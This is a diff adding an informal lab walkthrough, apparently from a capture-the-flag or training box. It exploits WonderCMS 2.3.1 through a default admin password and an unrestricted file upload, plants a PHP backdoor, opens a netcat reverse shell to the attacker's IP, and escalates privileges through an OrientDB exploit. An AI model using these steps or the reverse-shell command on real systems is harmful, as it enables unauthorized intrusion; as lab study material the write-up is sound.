@@ -1,0 +1,45 @@
+Wonder CMS 2.3.1 - Unrestricted File Upload
+Wonder CMS 2.3.1 - Unrestricted File Upload. CVE-2017-14521 . webapps exploit for PHP platform
+
+xx.xx.xx.98 WonderCMS
+
+8585/ port running http service
+
+Go to this url and I see wonder cms. And I searched exploit 
+https://www.exploit-db.com/exploits/43963
+
+Default password is "admin" ve tried it and I was in . 
+
+Setting has got files themes and plugins. 
+You can use files and upload script code 
+ Or upload in themes and plugins prepared script code as zip file  
+
+Setting/files under simple php backdoor uploaded dosya.php
+
+I looked Gobuster   /webinclude seeing 
+
+I called my script  //machine_ip:port/webinclude/dosya.php
+
+nc -nlvp 8385
+
+//machine_ip:port/webinclude/dosya.php?cmd=nc kendi_ip 8385 -e /bin/bash
+
+I got shell 
+(ps:8385 only running  other  port don't  run.  8385 important )
+
+Local.txt reading 
+Priv.esc.
+
+ /opt  orientdb 
+
+https://www.exploit-db.com/exploits/44068
+
+!! Ports in places with queries in the exploit are corrected to 8385.
+
+Python Orient.py runs as 127.0.0.1.
+
+!!!! When asked for an ip address, his own ip is written.
+
+nc -nlvp 8385
+
+Shell is taken.
